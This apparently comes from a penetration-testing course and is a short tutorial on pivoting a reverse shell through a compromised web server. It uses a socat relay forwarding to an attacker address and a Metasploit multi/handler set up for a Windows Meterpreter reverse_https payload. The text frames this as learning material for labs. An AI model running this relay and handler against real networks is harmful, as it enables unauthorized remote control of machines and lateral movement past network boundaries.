[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling.

We can use it for reverse shell from internal host ----> pivot host ---> attack host. Because internal host is not directly accessible from attack host.
#### Starting Socat Listener

	ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

#### Configuring & Starting the multi/handler

	msf6 > use exploit/multi/handler 
	
	[*] Using configured payload generic/shell_reverse_tcp 
	msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https 
	payload => windows/x64/meterpreter/reverse_https 
	msf6 exploit(multi/handler) > set lhost 0.0.0.0 
	lhost => 0.0.0.0 
	msf6 exploit(multi/handler) > set lport 80 
	lport => 80 
	msf6 exploit(multi/handler) > run 
	
	[*] Started HTTPS reverse handler on https://0.0.0.0:80

